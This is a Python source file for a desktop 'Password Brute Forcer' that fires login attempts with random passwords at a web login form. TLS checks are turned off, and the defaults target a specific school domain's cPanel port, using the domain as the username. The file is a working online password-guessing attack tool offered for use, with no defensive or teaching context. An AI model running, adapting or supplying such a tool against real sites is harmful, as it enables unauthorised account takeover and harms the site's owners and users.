import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog
import requests
import urllib3
import string
import random
import threading
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = None
USERNAME = None
WORDLIST_PATH = None

session = requests.Session()

COMMON_PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "sunshine",
    "qwerty123", "iloveyou", "princess", "admin", "welcome",
    "666666", "abc123", "football", "123123", "monkey",
    "654321", "!@#$%^&*", "changeme", "test", "guest",
    "letmein", "passw0rd", "admin123", "Pa$$w0rd", "p@ssw0rd",
    "root", "toor", "0", "1", "pass", "admin1", "administrator",
    "demo", "default", "temp", "temporary", "secret",
    "qwertyuiop", "asdfghjkl", "zxcvbnm",
    "1234567890", "000000", "121212", "123321",
    "pass123", "pass1234", "admin1234",
    "P@ssw0rd!", "P@$$w0rd", "Password1", "Password123",
]

CHARSET = string.ascii_letters + string.digits + string.punctuation
MIN_LEN = 8
MAX_LEN = 25
total_attempts = 0
stop_event = threading.Event()


def try_login(password):
    global total_attempts
    total_attempts += 1
    try:
        resp = session.post(
            f"{BASE_URL}/login/",
            data={"user": USERNAME, "pass": password, "login": ""},
            allow_redirects=True,
            timeout=10,
            verify=False,
        )
        success = "login_form" not in resp.text and "Log in" not in resp.text[:2000]
        if success:
            return True
        if resp.status_code == 302 and resp.headers.get("Location", "").rstrip("/") != "/login":
            return True
        return False
    except requests.ConnectionError:
        return None
    except requests.Timeout:
        return None
    except Exception:
        return None


def load_wordlist(path):
    if not os.path.isfile(path):
        return None
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]


class BruteForceGUI:
    def __init__(self, root):
        self.root = root
        root.title("Password Brute Forcer")
        root.geometry("750x650")
        root.resizable(True, True)

        main = ttk.Frame(root, padding=10)
        main.pack(fill=tk.BOTH, expand=True)

        ttk.Label(main, text="Target URL:").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.url_entry = ttk.Entry(main, width=60)
        self.url_entry.grid(row=0, column=1, columnspan=3, sticky=tk.EW, pady=2)
        self.url_entry.insert(0, "https://cfschools.net.ng:2083")

        ttk.Label(main, text="Username:").grid(row=1, column=0, sticky=tk.W, pady=2)
        self.user_entry = ttk.Entry(main, width=60)
        self.user_entry.insert(0, "cfschools.net.ng")
        self.user_entry.grid(row=1, column=1, columnspan=3, sticky=tk.EW, pady=2)

        ttk.Label(main, text="Wordlist:").grid(row=2, column=0, sticky=tk.W, pady=2)
        self.wordlist_entry = ttk.Entry(main, width=50)
        self.wordlist_entry.insert(0, "C:/xampp/htdocs/music/wordlist.txt")
        self.wordlist_entry.grid(row=2, column=1, columnspan=2, sticky=tk.EW, pady=2)
        ttk.Button(main, text="Browse", command=self.browse_wordlist).grid(
            row=2, column=3, padx=(5, 0), pady=2
        )

        ttk.Label(main, text="Charset:").grid(row=3, column=0, sticky=tk.W, pady=2)
        self.charset_var = tk.StringVar(value="all printable")
        self.charset_menu = ttk.Combobox(
            main,
            textvariable=self.charset_var,
            values=[
                "numbers (0-9)",
                "lowercase (a-z)",
                "lowercase + numbers",
                "letters (a-z, A-Z)",
                "letters + numbers",
                "all printable",
            ],
            state="readonly",
            width=25,
        )
        self.charset_menu.grid(row=3, column=1, sticky=tk.W, pady=2)

        len_frame = ttk.Frame(main)
        len_frame.grid(row=4, column=0, columnspan=4, sticky=tk.W, pady=2)
        ttk.Label(len_frame, text="Min Length:").pack(side=tk.LEFT)
        self.min_spin = ttk.Spinbox(len_frame, from_=1, to_=20, width=5)
        self.min_spin.pack(side=tk.LEFT, padx=(0, 15))
        self.min_spin.set(8)
        ttk.Label(len_frame, text="Max Length:").pack(side=tk.LEFT)
        self.max_spin = ttk.Spinbox(len_frame, from_=1, to_=30, width=5)
        self.max_spin.pack(side=tk.LEFT, padx=(0, 15))
        self.max_spin.set(25)

        btn_frame = ttk.Frame(main)
        btn_frame.grid(row=5, column=0, columnspan=4, pady=8)
        self.start_btn = ttk.Button(btn_frame, text="Start", command=self.start_attack)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        self.stop_btn = ttk.Button(
            btn_frame, text="Stop", command=self.stop_attack, state=tk.DISABLED
        )
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Clear Log", command=self.clear_log).pack(
            side=tk.LEFT, padx=5
        )

        ttk.Label(main, text="Log:").grid(row=6, column=0, sticky=tk.NW, pady=(5, 0))
        self.log = scrolledtext.ScrolledText(
            main, height=20, width=80, state=tk.DISABLED
        )
        self.log.grid(row=6, column=1, columnspan=3, sticky=tk.NSEW, pady=(5, 0))

        self.result_var = tk.StringVar()
        ttk.Label(
            main, textvariable=self.result_var, font=("", 10, "bold"), foreground="green"
        ).grid(row=7, column=0, columnspan=4, pady=5)

        main.columnconfigure(1, weight=1)
        main.rowconfigure(6, weight=1)

    def write_log(self, msg):
        self.log.configure(state=tk.NORMAL)
        self.log.insert(tk.END, msg + "\n")
        self.log.see(tk.END)
        self.log.configure(state=tk.DISABLED)
        self.root.update_idletasks()

    def clear_log(self):
        self.log.configure(state=tk.NORMAL)
        self.log.delete(1.0, tk.END)
        self.log.configure(state=tk.DISABLED)

    def browse_wordlist(self):
        path = filedialog.askopenfilename(title="Select Wordlist File")
        if path:
            self.wordlist_entry.delete(0, tk.END)
            self.wordlist_entry.insert(0, path)

    def set_controls(self, enabled):
        state = tk.NORMAL if enabled else tk.DISABLED
        self.url_entry.configure(state=state)
        self.user_entry.configure(state=state)
        self.wordlist_entry.configure(state=state)
        self.charset_menu.configure(state=state)
        self.min_spin.configure(state=state)
        self.max_spin.configure(state=state)
        self.start_btn.configure(state=state)
        self.stop_btn.configure(state=tk.DISABLED if enabled else tk.NORMAL)

    def stop_attack(self):
        stop_event.set()
        self.write_log("[!] Stopping...")

    def worker(self):
        global BASE_URL, USERNAME, WORDLIST_PATH, CHARSET, MIN_LEN, MAX_LEN, total_attempts, session, stop_event

        stop_event.clear()
        session = requests.Session()
        total_attempts = 0
        self.result_var.set("")

        BASE_URL = self.url_entry.get().strip().rstrip("/")
        USERNAME = self.user_entry.get().strip()
        WORDLIST_PATH = self.wordlist_entry.get().strip()

        if not BASE_URL or not USERNAME:
            self.write_log("[!] URL and Username are required.")
            self.root.after(0, lambda: self.set_controls(True))
            return

        charset_map = {
            "numbers (0-9)": string.digits,
            "lowercase (a-z)": string.ascii_lowercase,
            "lowercase + numbers": string.ascii_lowercase + string.digits,
            "letters (a-z, A-Z)": string.ascii_letters,
            "letters + numbers": string.ascii_letters + string.digits,
            "all printable": string.ascii_letters + string.digits + string.punctuation,
        }
        CHARSET = charset_map.get(self.charset_var.get(), string.ascii_lowercase + string.digits)
        MIN_LEN = int(self.min_spin.get())
        MAX_LEN = int(self.max_spin.get())

        self.write_log(f"[*] Target: {BASE_URL}/login/")
        self.write_log(f"[*] Username: {USERNAME}")

        # Load previously tried passwords
        tried_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tried_passwords.txt")
        already_tried = set()
        if os.path.exists(tried_file):
            with open(tried_file, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    p = line.strip()
                    if p:
                        already_tried.add(p)
            self.write_log(f"[*] Loaded {len(already_tried)} previously tried passwords (will skip them)")

        tried_fh = open(tried_file, "a", encoding="utf-8")

        upper = string.ascii_uppercase
        lower = string.ascii_lowercase
        digits = string.digits
        symbols = string.punctuation
        all_chars = upper + lower + digits + symbols

        self.write_log(
            f"[*] Generating mixed-format passwords (len {MIN_LEN}-{MAX_LEN})..."
        )
        self.write_log(
            "[*] Each password: upper + lower + digit + symbol (like N7@vQ!2kLp#9Xr$4Mz&w)"
        )

        already_tried = set()
        for length in range(MIN_LEN, MAX_LEN + 1):
            self.write_log(f"[*] Trying length {length}...")
            while True:
                if stop_event.is_set():
                    self.write_log("[!] Stopped by user.")
                    tried_fh.close()
                    self.root.after(0, lambda: self.set_controls(True))
                    return

                if length < 4:
                    pwd = "".join(random.choice(all_chars) for _ in range(length))
                else:
                    pwd = [
                        random.choice(upper),
                        random.choice(lower),
                        random.choice(digits),
                        random.choice(symbols),
                    ]
                    pwd += [random.choice(all_chars) for _ in range(length - 4)]
                    random.shuffle(pwd)
                    pwd = "".join(pwd)

                if pwd in already_tried:
                    continue
                already_tried.add(pwd)
                tried_fh.write(pwd + "\n")
                tried_fh.flush()

                self.write_log(f"[~] Trying ({total_attempts}): {pwd}")
                result = try_login(pwd)
                if result is True:
                    self.write_log(f"\n[+] SUCCESS! Password: {pwd}")
                    self.write_log(f"[+] Total attempts: {total_attempts}")
                    self.root.after(0, lambda p=pwd: self.result_var.set(f"Password found: {p}"))
                    tried_fh.close()
                    self.root.after(0, lambda: self.set_controls(True))
                    return
                elif result is None:
                    self.write_log(f"[!] Connection error, retrying next password...")

        self.write_log(f"[-] No password found after {total_attempts} attempts.")
        tried_fh.close()
        self.root.after(0, lambda: self.set_controls(True))

    def start_attack(self):
        self.clear_log()
        self.set_controls(False)
        threading.Thread(target=self.worker, daemon=True).start()


if __name__ == "__main__":
    root = tk.Tk()
    app = BruteForceGUI(root)
    root.mainloop()
